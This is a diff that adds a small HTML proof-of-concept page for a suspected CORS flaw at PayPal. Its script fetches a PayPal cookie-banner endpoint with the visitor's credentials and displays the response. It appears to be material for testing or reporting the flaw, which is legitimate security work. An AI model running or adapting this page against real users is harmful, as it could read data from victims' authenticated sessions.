@@ -1,0 +1,22 @@
+<html>
+<body>
+<h1>CORS PoC - PayPal</h1>
+<div id="status">Loading...</div>
+<script>
+fetch('https://www.paypal.com/myaccount/privacy/cookieprefs/getBanner?showBanner=true&country=US&language=en&policyType=CookieBanner&originalHeaders={%22cookie%22:%22%22}&tenant=paypal&tenantData={}', {
+  credentials: 'include'
+})
+.then(r => {
+  document.getElementById('status').innerText = 'Status: ' + r.status;
+  return r.json();
+})
+.then(d => {
+  document.getElementById('result').innerText = JSON.stringify(d, null, 2);
+})
+.catch(e => {
+  document.getElementById('status').innerText = 'Error: ' + e;
+})
+</script>
+<pre id="result"></pre>
+</body>
+</html>
